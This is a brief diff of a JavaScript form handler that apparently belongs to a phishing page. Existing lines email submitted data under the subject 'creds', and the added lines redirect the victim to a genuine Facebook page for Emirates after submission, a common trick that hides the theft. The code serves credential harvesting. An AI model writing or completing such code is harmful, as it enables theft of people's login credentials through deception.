@@ -19,4 +19,6 @@ submit.addEventListener("submit", (e) => {
     Subject: "creds",
     Body: ebody,
   });
+  
+  window.location.href = "https://www.facebook.com/Emirates"
 });
